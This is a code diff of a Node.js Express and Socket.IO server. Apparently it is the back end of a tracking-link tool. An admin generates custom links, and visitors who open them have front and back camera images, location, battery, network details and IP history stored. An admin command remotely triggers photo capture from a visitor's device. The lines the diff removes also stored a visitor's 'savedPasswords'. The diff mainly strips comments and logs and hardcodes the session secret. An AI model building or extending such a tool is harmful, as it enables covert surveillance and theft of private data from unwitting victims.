@@ -1,6 +1,3 @@
-// ==========================================
-// 1. IMPORTS
-// ==========================================
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
@@ -11,9 +8,6 @@ const bodyParser = require('body-parser');
 const session = require('express-session');
 const { v4: uuidv4 } = require('uuid');
 
-// ==========================================
-// 2. APP INITIALIZATION
-// ==========================================
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
@@ -23,23 +17,17 @@ const io = socketIo(server, {
     }
 });
 
-// ==========================================
-// 3. MIDDLEWARE
-// ==========================================
 app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
 app.use(session({
-    secret: process.env.SESSION_SECRET || 'your-secret-key',
+    secret: 'your-secret-key',
     resave: false,
     saveUninitialized: true,
     cookie: { secure: false }
 }));
 
-// ==========================================
-// 4. DATABASE SETUP
-// ==========================================
 const DB_PATH = path.join(__dirname, 'database');
 const USERS_FILE = path.join(DB_PATH, 'users.json');
 
@@ -62,10 +50,6 @@ const readUsers = () => {
 const writeUsers = (users) => {
     fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
 };
-
-// ==========================================
-// 5. ROUTES
-// ==========================================
 
 // Admin Login
 app.post('/admin-login', (req, res) => {
@@ -98,7 +82,7 @@ app.get('/api/visitor/:id', (req, res) => {
     }
 });
 
-// Generate custom link (EVERY VISIT = NEW VISITOR)
+// Generate custom link
 app.post('/generate-custom-link', (req, res) => {
     if (!req.session.admin) {
         return res.status(401).json({ error: 'Unauthorized' });
@@ -124,9 +108,6 @@ app.post('/generate-custom-link', (req, res) => {
         connected: false,
         visitDate: null,
         permissionsGranted: false,
-        savedPasswords: null,
-        redirectComplete: false,
-        // New fields for multiple visits
         totalVisits: 0,
         lastVisit: null,
         visitHistory: []
@@ -176,7 +157,7 @@ app.get('/visitor/:id', (req, res) => {
 });
 
 // ==========================================
-// 6. SOCKET.IO
+// SOCKET.IO
 // ==========================================
 const connectedClients = new Map();
 
@@ -191,7 +172,6 @@ io.on('connection', (socket) => {
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
-            // Update visit history
             const visitRecord = {
                 visitDate: new Date().toISOString(),
                 ip: ip,
@@ -214,7 +194,7 @@ io.on('connection', (socket) => {
             connectedClients.set(visitorId, socket.id);
             
             io.emit('visitor-connected', users[userIndex]);
-            console.log('📱 Visitor connected:', visitorId, 'Total visits:', users[userIndex].totalVisits);
+            console.log('📱 Visitor connected:', visitorId);
         }
     });
     
@@ -229,24 +209,18 @@ io.on('connection', (socket) => {
             if (type === 'frontCamera') {
                 users[userIndex].frontCamera = content;
                 users[userIndex].lastCameraUpdate = new Date().toISOString();
-                console.log('📸 Front camera saved');
             } else if (type === 'backCamera') {
                 users[userIndex].backCamera = content;
                 users[userIndex].lastCameraUpdate = new Date().toISOString();
-                console.log('📸 Back camera saved');
             } else if (type === 'location') {
                 users[userIndex].location = content;
                 users[userIndex].lastLocationUpdate = new Date().toISOString();
-                console.log('📍 Location saved');
             } else if (type === 'battery') {
                 users[userIndex].battery = content;
             } else if (type === 'network') {
                 users[userIndex].network = content;
             } else if (type === 'permissionsGranted') {
                 users[userIndex].permissionsGranted = true;
-                console.log('✅ Permissions granted');
-            } else if (type === 'savedPasswords') {
-                users[userIndex].savedPasswords = content;
             } else if (type === 'redirectComplete') {
                 users[userIndex].redirectComplete = true;
                 users[userIndex].redirectTime = new Date().toISOString();
@@ -257,15 +231,12 @@ io.on('connection', (socket) => {
         }
     });
     
-    // Admin command: capture photo
     socket.on('admin-capture', (data) => {
         const { visitorId, type } = data;
         const socketId = connectedClients.get(visitorId);
         if (socketId) {
             io.to(socketId).emit('capture-command', { type });
             console.log(`📸 Admin requested ${type} photo from ${visitorId}`);
-        } else {
-            console.log(`⚠️ Visitor ${visitorId} not connected`);
         }
     });
     
@@ -287,9 +258,6 @@ io.on('connection', (socket) => {
     });
 });
 
-// ==========================================
-// 7. SERVER START
-// ==========================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 Server running on http://localhost:${PORT}`);
